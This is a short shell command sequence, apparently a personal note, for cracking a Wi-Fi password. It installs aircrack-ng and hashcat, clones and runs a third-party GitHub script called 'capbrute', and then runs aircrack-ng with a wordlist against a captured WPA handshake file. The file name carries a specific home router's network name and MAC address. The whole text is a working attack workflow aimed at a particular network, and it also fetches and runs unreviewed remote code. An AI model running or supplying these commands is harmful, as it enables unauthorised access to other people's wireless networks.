sudo apt-get update-y
sudo apt install aircrack-ng python3 hashcat -y
git clone https://github.com/JamalNiga/capbrute.git cap
cd cap && ls -al
python3 hy.py
aircrack-ng -w *txt handshake_inwiHome4GA0F511_E2-9F-2E-11-F5-A2_2023-10-12T17-30-35.cap
